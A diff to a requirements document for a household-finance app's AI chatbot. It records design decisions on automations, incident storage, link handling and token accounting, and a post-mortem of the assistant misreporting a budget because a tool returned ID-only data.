+| ~~Q-P04~~ | ~~Should T2 automations run on a schedule, or on data arrival (post-Plaid-sync)?~~ | **Decided.** On data arrival — it bounds volume to what actually changed and makes idempotency natural. Revisit if an automation turns out to need a clock rather than an event. |
+| ~~Q-P05~~ | ~~Where does the trace/incident store live given the JSON-file storage model?~~ | **Decided.** Per-family JSON, written through a narrow appender scoped to that one namespace — not a general write capability handed to the chatbot. |
+| ~~Q-P06~~ | ~~External links clickable, or inert per SEC-P024?~~ | **Decided.** Clickable, with mandatory host disclosure. SEC-P024 amended accordingly; see §7.3. |
+| ~~Q-P07~~ | ~~Should §11's Business Workspace AI exclusion be enforced, given it removes a working feature?~~ | **Decided.** Enforce it — the owner confirms there is no real use case for AI in that workspace. This closes a live exposure, not merely a policy gap: a business-scoped token could read client royalty transactions through the spending tools. |
+| ~~Q-P08~~ | ~~Are the configured model rates correct for the 5-series models?~~ | **Decided.** Rates re-verified, and the two structural undercounts they exposed — uncounted cached tokens and uncounted failed-request tokens — are now requirements in §8 rather than a one-time fix. Worth carrying forward: the 5-series tokenizer produces roughly 30% more tokens for the same text, so an unchanged cap buys materially fewer frontier-model conversations than it used to. |
 
 ## 15. Reserved — Agent Learnings
 
-Full specification lives in a **separate BRD** (`AI-AGENT-LEARNINGS-BRD.md`, pending). This section reserves the platform decisions so that tooling built in Phases 1–2 does not foreclose it.
+Full specification lives in a separate BRD, [AI-AGENT-LEARNINGS-BRD.md](AI-AGENT-LEARNINGS-BRD.md). This section reserves the platform decisions so that platform tooling does not foreclose it.
 
 ### 15.1 Motivating Incident
 
 A user asked about the household's Subaru maintenance budget. The assistant stated a $500/month budget. The actual budget was $0 / unset.
 
-The probable mechanism is a **tool-design defect, not a model defect**: `getBudgets` returns `{id, categoryId, month, amount}` with no category names, and a category with no budget row is simply absent from the array. Answering the question requires joining an ID-only list against `get_categories`, and absence is indistinguishable from "I did not look." The tool's own description compounded this by claiming it returned "budget amounts **and actuals**" when it returned none at all. **Fixed in `d313041`:** `get_budgets` now returns category names and an explicit `hasBudget` flag, and its description in `capabilities/readCapabilities.ts` states plainly that it does NOT return actual spending.
+The probable mechanism is a **tool-design defect, not a model defect**: `getBudgets` returns `{id, categoryId, month, amount}` with no category names, and a category with no budget row is simply absent from the array. Answering the question requires joining an ID-only list against `get_categories`, and absence is indistinguishable from "I did not look." The tool's own description compounded this by claiming it returned "budget amounts **and actuals**" when it returned none at all.
 
 This incident is the reason for SEC-P032, SEC-P033, and REQ-P019 — and the reason for D-P08: **an agent asked to introspect "why did I say $500?" cannot observe any of the above.** It would produce a fluent, confident, wrong learning — the same failure mode one level up.
 
